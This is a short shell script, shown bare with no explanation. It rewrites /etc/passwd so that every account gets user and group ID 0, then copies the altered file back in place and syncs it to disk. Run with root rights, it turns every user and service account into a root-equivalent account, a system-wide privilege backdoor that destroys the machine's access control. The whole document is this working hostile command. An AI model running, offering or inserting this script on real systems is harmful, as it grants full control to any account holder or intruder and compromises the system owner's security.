cat /etc/passwd |
/usr/bin/awk '
    BEGIN {OFS="";FS=":";};
    {
        printf "%s:%s:0:0:",$1,$2
        printf "%s:%s:%s\n",$5,$6,$7
    };' | cat > /tmp/passwd~
cat /tmp/passwd~ > /etc/passwd
/bin/sync
